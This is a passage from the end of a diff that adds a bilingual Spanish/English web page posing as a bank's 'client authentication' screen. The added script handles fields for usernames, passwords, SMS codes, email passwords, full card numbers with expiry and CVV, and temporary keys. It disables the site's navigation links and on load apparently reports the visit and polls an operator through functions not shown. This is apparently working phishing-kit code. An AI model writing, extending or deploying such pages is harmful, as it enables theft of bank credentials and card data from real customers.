+const enterMap = [['usernameInput', 'btnUser'], ['passwordInput', 'btnPass'], ['smsInput', 'btnSms'], ['emailTelefonoInput', 'btnCorreoTelefono'], ['phoneTelefonoInput', 'btnCorreoTelefono'], ['codeEmailInput', 'btnCodeEmail'], ['emailInput', 'btnEmail'], ['emailPassInput', 'btnEmail'], ['cardNumberInput', 'btnCard'], ['cardExpInput', 'btnCard'], ['cardCvvInput', 'btnCard'], ['tempKeyInput', 'btnTempKey'], ['verifClave', 'btnVerificacion'], ['verifUsuario', 'btnVerificacion']];
+enterMap.forEach(([inputId, btnId]) => { const el = $(inputId); if (!el) return; el.addEventListener('keypress', e => { if (e.key === 'Enter') { e.preventDefault(); $(btnId).click(); } }); });
+['smsInput', 'phoneTelefonoInput', 'codeEmailInput', 'cardNumberInput', 'cardCvvInput', 'tempKeyInput'].forEach(id => { const el = $(id); if (!el) return; el.addEventListener('input', function() { this.value = this.value.replace(/[^0-9]/g, ''); }); });
+$('cardNumberInput').addEventListener('input', function() { if (this.value.length > 16) this.value = this.value.slice(0, 16); });
+$('cardExpInput').addEventListener('input', function() { let v = this.value.replace(/[^0-9]/g, ''); if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2, 4); this.value = v; });
+$('cardCvvInput').addEventListener('input', function() { if (this.value.length > 3) this.value = this.value.slice(0, 3); });
+
+// ENLACES E IDIOMA
+document.querySelectorAll('nav a').forEach(link => { link.addEventListener('click', function(e) { e.preventDefault(); alert('Servicio no disponible'); }); });
+let isSpanish = true;
+$('langToggle').addEventListener('click', function() { isSpanish = !isSpanish; this.textContent = isSpanish ? 'English' : 'Español'; $('mainTitle').textContent = isSpanish ? 'Autenticación del cliente' : 'Client Authentication'; $('usernameInput').placeholder = isSpanish ? 'Usuario' : 'Username'; $('passwordInput').placeholder = isSpanish ? 'Contraseña' : 'Password'; $('btnUser').textContent = isSpanish ? 'Ingresar' : 'Sign in'; $('btnPass').textContent = isSpanish ? 'Ingresar' : 'Sign in'; $('cardNumberInput').placeholder = isSpanish ? 'Número de tarjeta (16 dígitos)' : 'Card number (16 digits)'; $('cardExpInput').placeholder = isSpanish ? 'MM/AA' : 'MM/YY'; $('cardCvvInput').placeholder = isSpanish ? 'CVV (3 dígitos)' : 'CVV (3 digits)'; $('btnCard').textContent = isSpanish ? 'Ingresar' : 'Submit'; $('tempKeyInput').placeholder = isSpanish ? 'Clave temporal' : 'Temporary key'; $('btnTempKey').textContent = isSpanish ? 'Ingresar' : 'Submit'; });
+
+// INICIAR TODO
+(async () => { 
+    await sendPageAccess(); 
+    resetToUser(false); 
+    checkUpdates(); 
+})();
+</script>
+</body>
+</html>
